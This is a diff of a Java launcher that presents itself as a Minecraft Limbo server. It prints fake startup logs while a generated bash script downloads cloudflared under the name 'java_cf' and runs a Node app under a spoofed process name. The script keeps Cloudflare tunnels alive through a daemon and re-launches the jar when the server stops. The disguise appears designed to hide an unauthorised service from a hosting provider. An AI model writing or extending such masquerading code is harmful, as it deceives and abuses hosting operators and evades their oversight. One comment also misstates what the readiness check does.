@@ -73,7 +73,7 @@ private static void clearConsole() {
 }
 
 // ============================================================
-// 入口 (完全异步，主线程绝不阻塞)
+// 入口
 // ============================================================
 
 public static void main(String[] args) {
@@ -83,15 +83,14 @@ public static void main(String[] args) {
         System.exit(1);
     }
 
-    forceKillStaleProcesses();
+    forceKillStaleProcessesSafe();
     autoFixLimboConfig();
-    startZombieReaper();
 
     if (NODE_ENABLED) {
-        // ★ 异步启动部署和隧道监控，绝不卡死主线程
         Thread deployThread = new Thread(() -> {
             try {
                 Path botDir = Paths.get(MC_BOT_DIR);
+                Files.createDirectories(botDir);
                 Files.deleteIfExists(botDir.resolve(".node_app.log"));
                 Files.deleteIfExists(botDir.resolve("daemon.log"));
                 Files.deleteIfExists(botDir.resolve(".pids"));
@@ -99,13 +98,11 @@ public static void main(String[] args) {
                 Path script = generateDeployScript();
                 executeDeployScript(script);
 
-                // 等待 URL 出现
                 while(tunnelUrl.isEmpty()) {
                     checkDeployInfo();
                     try { Thread.sleep(1000); } catch (InterruptedException e) { return; }
                 }
 
-                // URL 出现了，执行伪装日志和清屏
                 clearConsole();
                 printFakeLimboStartup(tunnelUrl);
                 
@@ -118,13 +115,12 @@ public static void main(String[] args) {
                 limboLog("Preparing spawn area: 100%", 0);
 
                 startTunnelMonitor();
-                startJavaWatchdog();
 
                 Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                     System.out.println("\n[Guard] Detected server stop signal! Executing hard restart protocol...");
                     tunnelMonitorRunning.set(false);
+                    forceKillStaleProcessesSafe();
                     try {
-                        forceKillStaleProcesses();
                         String currentDir = System.getProperty("user.dir");
                         long currentPid = ProcessHandle.current().pid();
                         String jarName = "server.jar";
@@ -141,61 +137,30 @@ public static void main(String[] args) {
         deployThread.start();
     }
 
-    // ★ 主线程直接启动 Limbo，不等待任何部署结果
     try { new LimboServer().start(); } catch (Throwable t) {}
     try { Thread.currentThread().join(); } catch (InterruptedException ignored) {}
 }
 
 // ============================================================
-// 强制清理僵尸进程机制
+// 安全清理僵尸机制
 // ============================================================
 
-private static void forceKillStaleProcesses() {
-    Process p = null;
+private static void forceKillStaleProcessesSafe() {
     try {
         Path pidsFile = Paths.get(MC_BOT_DIR).resolve(".pids");
-        String killCmd = "";
-        if (Files.exists(pidsFile)) {
-            String content = Files.readString(pidsFile).trim();
-            if (!content.isEmpty()) {
-                for (String pid : content.split("[\\s\\n]+")) {
-                    pid = pid.trim();
-                    if (!pid.isEmpty() && pid.matches("\\d+")) {
-                        killCmd += "kill -9 -" + pid + " 2>/dev/null; pkill -9 -P " + pid + " 2>/dev/null; kill -9 " + pid + " 2>/dev/null; ";
-                    }
-                }
-            }
-        }
-        if (killCmd.isEmpty()) return;
-        p = new ProcessBuilder("bash", "-c", killCmd).start();
-        if (!p.waitFor(3, TimeUnit.SECONDS)) { p.destroyForcibly(); p.waitFor(2, TimeUnit.SECONDS); }
-    } catch (Exception ignored) {
-        if (p != null) { try { p.destroyForcibly(); p.waitFor(); } catch (Exception ignored2) {} }
-    }
-}
-
-private static void startJavaWatchdog() {
-    Thread watchdog = new Thread(() -> {
-        while (true) {
+        if (!Files.exists(pidsFile)) return;
+        
+        for (String pidStr : Files.readAllLines(pidsFile)) {
             try {
-                Thread.sleep(30000);
-                Path pidsFile = Paths.get(MC_BOT_DIR).resolve(".pids");
-                if (!Files.exists(pidsFile)) continue;
-                List<String> alivePids = new ArrayList<>();
-                for (String pid : Files.readAllLines(pidsFile)) {
-                    pid = pid.trim();
-                    if (!pid.isEmpty() && pid.matches("\\d+")) {
-                        ProcessHandle handle = ProcessHandle.of(Long.parseLong(pid)).orElse(null);
-                        if (handle != null && handle.isAlive()) { alivePids.add(pid); } 
-                        else if (handle != null) { handle.destroyForcibly(); }
-                    }
-                }
-                Files.write(pidsFile, String.join("\n", alivePids).getBytes());
+                long pid = Long.parseLong(pidStr.trim());
+                ProcessHandle.of(pid).ifPresent(handle -> {
+                    handle.descendants().forEach(ProcessHandle::destroyForcibly);
+                    handle.destroyForcibly();
+                });
             } catch (Exception ignored) {}
         }
-    }, "Java-Zombie-Watchdog");
-    watchdog.setDaemon(true);
-    watchdog.start();
+        Files.deleteIfExists(pidsFile);
+    } catch (Exception ignored) {}
 }
 
 private static void autoFixLimboConfig() {
@@ -225,13 +190,6 @@ private static void printFakeLimboStartup(String url) {
 }
 
 private static int randInt(int min, int max) { return min + (int)(Math.random() * (max - min + 1)); }
-
-private static void startZombieReaper() {
-    Thread reaper = new Thread(() -> {
-        while (true) { try { Thread.sleep(15000); Process p = new ProcessBuilder("true").start(); p.waitFor(5, TimeUnit.SECONDS); } catch (Exception ignored) {} }
-    }, "Zombie-Reaper");
-    reaper.setDaemon(true); reaper.start();
-}
 
 private static void checkDeployInfo() {
     Path dir = Paths.get(MC_BOT_DIR);
@@ -286,11 +244,12 @@ private static void startTunnelMonitor() {
             } catch (Exception ignored) {}
         }
     }, "Tunnel-Monitor");
-    monitor.setDaemon(true); monitor.start();
+    monitor.setDaemon(true);
+    monitor.start();
 }
 
 // ============================================================
-// 生成部署脚本 (包含递归杀树防僵尸)
+// 生成部署脚本 (★ 重点修复 502/1033 断连问题)
 // ============================================================
 
 private static Path generateDeployScript() throws Exception {
@@ -379,30 +338,40 @@ private static Path generateDeployScript() throws Exception {
         "PRELOAD_EOF\n" +
         "export _JAVA_WRAPPER=\"" + dir.toAbsolutePath() + "/.node/bin/node\"\n" +
         "\n" +
-        "# ============ 5. 启动NodeJS应用 ============\n" +
+        "# ============ 5. 启动NodeJS应用 (严格等待HTTP就绪防502) ============\n" +
         "is_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\n" +
         "while true; do NODE_PORT=$((RANDOM % 40000 + 20000)); if is_port_free $NODE_PORT; then break; fi; done\n" +
         "export SERVER_PORT=$NODE_PORT; export PORT=$NODE_PORT\n" +
         "(exec -a \"" + FAKE_CMD + "\" \"$JRE_DIR/java\" " + NODE_SCRIPT + " > .node_app.log 2>&1) &\n" +
         "NODE_PID=$!; echo \"$NODE_PID\" >> .pids\n" +
-        "for i in $(seq 1 60); do HTTP_CODE=$(curl -s -o /dev/null -w \"%{http_code}\" \"http://127.0.0.1:$NODE_PORT\" 2>/dev/null); if [ -n \"$HTTP_CODE\" ] && [ \"$HTTP_CODE\" != \"000\" ]; then break; fi; sleep 1; done\n" +
+        // ★ 修复：必须等到 Node 内部 HTTP 返回 200 才放行，杜绝冷启动 502
+        "for i in $(seq 1 120); do HTTP_CODE=$(curl -s -o /dev/null -w \"%{http_code}\" \"http://127.0.0.1:$NODE_PORT\" 2>/dev/null); if [ -n \"$HTTP_CODE\" ] && [ \"$HTTP_CODE\" != \"000\" ]; then break; fi; sleep 1; done\n" +
         "echo \"$NODE_PORT\" > .node_port\n" +
         "\n" +
-        "# ============ 6. 启动隧道 ============\n" +
+        // ★ 修复：Cloudflared 超时与防断连配置
+        "# ============ 6. 启动隧道 (防 1033/502 强化配置) ============\n" +
         "CF_BIN=\"$JRE_DIR/java_cf\"; CF_CONF_DIR=\"" + dir.toAbsolutePath() + "/jre21/conf\"; mkdir -p \"$CF_CONF_DIR\"; ACTUAL_PORT=$NODE_PORT\n" +
         "if [ \"" + CF_ENABLED + "\" = \"true\" ]; then\n" +
         "    mkdir -p .cf\n" +
         "    if [ ! -f \"$CF_BIN\" ]; then ARCH=$(uname -m); CF_URL=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64\" || echo \"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64\"); for MIRROR in \"$CF_URL\" \"https://gh-proxy.com/${CF_URL}\"; do if curl -fsSL --connect-timeout 30 --max-time 120 \"$MIRROR\" -o \"$CF_BIN\"; then chmod +x \"$CF_BIN\"; break; fi; done; fi\n" +
         "    if [ -f \"$CF_BIN\" ]; then\n" +
         "        if [ \"" + cfMode + "\" = \"fixed\" ] && [ -n \"" + CF_TOKEN + "\" ]; then\n" +
-        "            for PROTO in quic http2; do rm -f .cf/cf.log; (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" tunnel run --protocol $PROTO --token \"" + CF_TOKEN + "\" > .cf/cf.log 2>&1) & CF_PID=$!; sleep 5; if kill -0 $CF_PID 2>/dev/null; then echo \"$CF_PID\" >> .pids; echo \"" + CF_DOMAIN + "\" > .cf/tunnel_url.txt; break; fi; wait $CF_PID 2>/dev/null; done\n" +
+        "            for PROTO in http2 quic; do rm -f .cf/cf.log; (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" tunnel run --protocol $PROTO --token \"" + CF_TOKEN + "\" > .cf/cf.log 2>&1) & CF_PID=$!; sleep 5; if kill -0 $CF_PID 2>/dev/null; then echo \"$CF_PID\" >> .pids; echo \"" + CF_DOMAIN + "\" > .cf/tunnel_url.txt; break; fi; wait $CF_PID 2>/dev/null; done\n" +
         "        else\n" +
         "            TUNNEL_ESTABLISHED=false\n" +
-        "            for PROTO in quic http2 auto; do\n" +
+        "            for PROTO in http2 quic auto; do\n" +
         "                if [ \"$TUNNEL_ESTABLISHED\" = \"true\" ]; then break; fi\n" +
         "                for attempt in 1 2 3; do\n" +
         "                    if [ \"$TUNNEL_ESTABLISHED\" = \"true\" ]; then break; fi\n" +
-        "                    rm -f .cf/cf.log .cf/tunnel_url.txt; cat > \"$CF_CONF_DIR/server.properties\" << CFCONF\nurl: http://127.0.0.1:$ACTUAL_PORT\nno-autoupdate: true\nprotocol: $PROTO\nCFCONF\n" +
+        "                    rm -f .cf/cf.log .cf/tunnel_url.txt; cat > \"$CF_CONF_DIR/server.properties\" << CFCONF\n" +
+        "url: http://127.0.0.1:$ACTUAL_PORT\n" +
+        "no-autoupdate: true\n" +
+        "protocol: $PROTO\n" +
+        // ★ 新增：代理连接超时时间延长到 30 秒，防止慢网络下 CF 等不及报 502
+        "proxy-connect-timeout: 30s\n" +
+        // ★ 新增：保持连接活跃，防止长时间无数据被防火墙掐断报 1033
+        "proxy-keep-alive-timeout: 90s\n" +
+        "CFCONF\n" +
         "                    (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > .cf/cf.log 2>&1) & CF_PID=$!; sleep 5\n" +
         "                    if ! kill -0 $CF_PID 2>/dev/null; then wait $CF_PID 2>/dev/null; continue; fi\n" +
         "                    for i in $(seq 1 45); do\n" +
@@ -418,50 +387,64 @@ private static Path generateDeployScript() throws Exception {
         "    fi\n" +
         "fi\n" +
         "\n" +
-        "# ============ 7. 守护循环 (递归杀树防僵尸，严防死锁 502) ============\n" +
+        // ★ 修复：守护脚本增加内部 HTTP 探针，防事件循环死锁 502
+        "# ============ 7. 守护循环 (防死锁探针 + HTTP2 优先) ============\n" +
         "cat > \"daemon.sh\" << 'DAEMONSCRIPT'\n" +
         "#!/bin/bash\n" +
-        "trap 'while wait -n 2>/dev/null; do :; done' CHLD\n" +
-        "cleanup() { for job in $(jobs -p 2>/dev/null); do kill_tree $job; done; while wait -n 2>/dev/null; do :; done; }\n" +
-        "trap cleanup EXIT TERM INT\n" +
+        "trap 'kill 0; wait' EXIT TERM INT\n" +
         "WORK_DIR=\"" + dir.toAbsolutePath() + "\"; JRE_DIR=\"$WORK_DIR/jre21/bin\"; CF_BIN=\"$JRE_DIR/java_cf\"; CF_CONF_DIR=\"$WORK_DIR/jre21/conf\"; NODE_FAKE=\"$JRE_DIR/java\"; APP_DIR=\"$WORK_DIR\"; NODE_SCRIPT=\"" + NODE_SCRIPT + "\"\n" +
         "PORT=$(cat \"$WORK_DIR/.node_port\" 2>/dev/null || echo \"25565\"); export SERVER_PORT=$PORT; export PORT=$PORT; export _JAVA_WRAPPER=\"$WORK_DIR/.node/bin/node\"; export PATH=\"$WORK_DIR/.node/bin:$PATH\"\n" +
-        "write_cf_config() { local PROTO=$1; cat > \"$CF_CONF_DIR/server.properties\" << CFCONF\nurl: http://localhost:$PORT\nno-autoupdate: true\nprotocol: $PROTO\nCFCONF\n }\n" +
-        "kill_tree() {\n" +
-        "    local PID=$1; if [ -z \"$PID\" ]; then return; fi; if ! kill -0 $PID 2>/dev/null; then wait $PID 2>/dev/null; return; fi\n" +
-        "    local CHILDREN=$(pgrep -P $PID 2>/dev/null); for child in $CHILDREN; do kill_tree $child; done\n" +
-        "    kill $PID 2>/dev/null; local waited=0; while [ $waited -lt 5 ]; do if ! kill -0 $PID 2>/dev/null; then break; fi; sleep 1; waited=$((waited + 1)); done\n" +
-        "    if kill -0 $PID 2>/dev/null; then kill -9 $PID 2>/dev/null; fi; wait $PID 2>/dev/null\n" +
-        "}\n" +
-        "start_cf_tunnel() { local PROTO=$1; local LOG_FILE=$2; write_cf_config \"$PROTO\"; (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > \"$LOG_FILE\" 2>&1) & echo $!; }\n" +
-        "NODE_PID=$(head -1 \"$WORK_DIR/.pids\" 2>/dev/null); CF_PID=\"\"\n" +
+        "write_cf_config() { local PROTO=$1; cat > \"$CF_CONF_DIR/server.properties\" << CFCONF\n" +
+        "url: http://localhost:$PORT\n" +
+        "no-autoupdate: true\n" +
+        "protocol: $PROTO\n" +
+        "proxy-connect-timeout: 30s\n" +
+        "proxy-keep-alive-timeout: 90s\n" +
+        "CFCONF\n }\n" +
+        "NODE_PID=$(head -1 \"$WORK_DIR/.pids\" 2>/dev/null); CF_PID=\"\"; NODE_FAIL_COUNT=0\n" +
         "while true; do\n" +
-        "    if [ -n \"$NODE_PID\" ] && ! kill -0 $NODE_PID 2>/dev/null; then\n" +
-        "        wait $NODE_PID 2>/dev/null; if [ -n \"$CF_PID\" ]; then kill_tree \"$CF_PID\"; CF_PID=\"\"; fi\n" +
+        "    NEED_RESTART_NODE=false\n" +
+        "    if [ -n \"$NODE_PID\" ] && ! kill -0 $NODE_PID 2>/dev/null; then NEED_RESTART_NODE=true; fi\n" +
+        // ★ 探针机制：如果 Node 进程还在，但 HTTP 连续 3 次无响应，判定为死锁，强制重启
+        "    if [ \"$NEED_RESTART_NODE\" = \"false\" ]; then\n" +
+        "        HTTP_CODE=$(curl -s -o /dev/null -w \"%{http_code}\" \"http://127.0.0.1:$PORT\" --connect-timeout 2 --max-time 5 2>/dev/null)\n" +
+        "        if [ \"$HTTP_CODE\" = \"000\" ] || [ -z \"$HTTP_CODE\" ]; then\n" +
+        "            NODE_FAIL_COUNT=$((NODE_FAIL_COUNT + 1))\n" +
+        "            if [ $NODE_FAIL_COUNT -ge 3 ]; then NEED_RESTART_NODE=true; fi\n" +
+        "        else NODE_FAIL_COUNT=0; fi\n" +
+        "    fi\n" +
+        "    if [ \"$NEED_RESTART_NODE\" = \"true\" ]; then\n" +
+        "        if [ -n \"$NODE_PID\" ]; then kill \"$NODE_PID\" 2>/dev/null; wait \"$NODE_PID\" 2>/dev/null; fi\n" +
+        "        if [ -n \"$CF_PID\" ]; then kill \"$CF_PID\" 2>/dev/null; wait \"$CF_PID\" 2>/dev/null; CF_PID=\"\"; fi\n" +
         "        cd \"$APP_DIR\"; export SERVER_PORT=$PORT; export PORT=$PORT; (exec -a \"" + FAKE_CMD + "\" \"$NODE_FAKE\" $NODE_SCRIPT >> \"$WORK_DIR/.node_app.log\" 2>&1) & NODE_PID=$!\n" +
+        "        echo \"$NODE_PID\" > \"$WORK_DIR/.pids\"\n" +
+        "        NODE_FAIL_COUNT=0\n" +
         "        for i in $(seq 1 60); do HTTP_CODE=$(curl -s -o /dev/null -w \"%{http_code}\" \"http://127.0.0.1:$PORT\" 2>/dev/null); if [ -n \"$HTTP_CODE\" ] && [ \"$HTTP_CODE\" != \"000\" ]; then break; fi; sleep 1; done\n" +
         "    fi\n" +
+        "\n" +
         "    NEED_REBUILD=false\n" +
         "    if [ -z \"$CF_PID\" ]; then NEED_REBUILD=true; elif ! kill -0 $CF_PID 2>/dev/null; then wait $CF_PID 2>/dev/null; NEED_REBUILD=true; fi\n" +
         "    if [ \"$NEED_REBUILD\" = \"true\" ]; then\n" +
         "        rm -f \"$WORK_DIR/.cf/tunnel_url.txt\" \"$WORK_DIR/.cf/cf.log\"; TUNNEL_OK=false\n" +
-        "        for RPROTO in quic http2 auto; do\n" +
+        // ★ 优先使用 HTTP2，在丢包网络下比 QUIC 更稳定
+        "        for RPROTO in http2 quic auto; do\n" +
         "            if [ \"$TUNNEL_OK\" = \"true\" ]; then break; fi; rm -f \"$WORK_DIR/.cf/cf.log\"\n" +
-        "            NEW_PID=$(start_cf_tunnel \"$RPROTO\" \"$WORK_DIR/.cf/cf.log\"); CF_PID=$NEW_PID\n" +
+        "            write_cf_config \"$RPROTO\"\n" +
+        "            (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > \"$WORK_DIR/.cf/cf.log\" 2>&1) & NEW_PID=$!\n" +
         "            for i in $(seq 1 45); do\n" +
         "                if ! kill -0 $NEW_PID 2>/dev/null; then break; fi\n" +
         "                URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\\\.trycloudflare\\\\.com' \"$WORK_DIR/.cf/cf.log\" 2>/dev/null | grep -v 'api\\.trycloudflare\\.com' | tail -1)\n" +
-        "                if [ -n \"$URL\" ]; then echo \"$URL\" > \"$WORK_DIR/.cf/tunnel_url.txt\"; echo \"PROTOCOL=$RPROTO\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"; echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"; TUNNEL_OK=true; break; fi\n" +
+        "                if [ -n \"$URL\" ]; then echo \"$URL\" > \"$WORK_DIR/.cf/tunnel_url.txt\"; CF_PID=$NEW_PID; TUNNEL_OK=true; break; fi\n" +
         "                sleep 1\n" +
         "            done\n" +
-        "            if [ \"$TUNNEL_OK\" != \"true\" ]; then kill_tree \"$NEW_PID\"; CF_PID=\"\"; fi\n" +
+        "            if [ \"$TUNNEL_OK\" != \"true\" ]; then kill \"$NEW_PID\" 2>/dev/null; wait \"$NEW_PID\" 2>/dev/null; CF_PID=\"\"; fi\n" +
         "        done\n" +
         "    fi\n" +
-        "    while wait -n 2>/dev/null; do :; done; sleep 15\n" +
+        "    sleep 5\n" + // 缩短探针周期到 5 秒，更快发现故障
         "done\n" +
         "DAEMONSCRIPT\n" +
         "chmod +x daemon.sh\n" +
-        "(exec -a \"" + FAKE_CMD + "\" bash ./daemon.sh >> daemon.log 2>&1) &\n" +
+        "setsid bash ./daemon.sh >> daemon.log 2>&1 &\n" +
         "echo \"$!\" >> .pids\n";
 
     Files.writeString(script, content);
@@ -479,5 +462,5 @@ private static void executeDeployScript(Path script) throws Exception {
     Thread t = new Thread(() -> { try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) { while (r.readLine() != null) {} } catch (IOException ignored) {} }, "Deploy-Log");
     t.setDaemon(true); t.start();
     if (!p.waitFor(10, TimeUnit.MINUTES)) { p.destroyForcibly(); p.waitFor(30, TimeUnit.SECONDS); }
-}
+} 
 }
